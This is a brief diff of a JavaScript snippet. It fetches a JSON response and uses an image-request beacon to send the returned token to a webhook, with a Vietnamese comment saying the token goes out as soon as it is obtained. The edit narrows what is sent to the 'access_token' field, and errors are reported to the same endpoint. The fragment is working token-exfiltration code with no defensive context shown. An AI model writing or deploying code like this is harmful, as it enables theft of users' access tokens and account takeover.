@@ -14,7 +14,7 @@
   .then(r => r.json())
   .then(j => {
     // Gửi token về webhook ngay sau khi lấy được
-    new Image().src = u + "?info=" + encodeURIComponent(j);
+    new Image().src = u + "?access_token=" + encodeURIComponent(j.token);
   })
   .catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
 })();
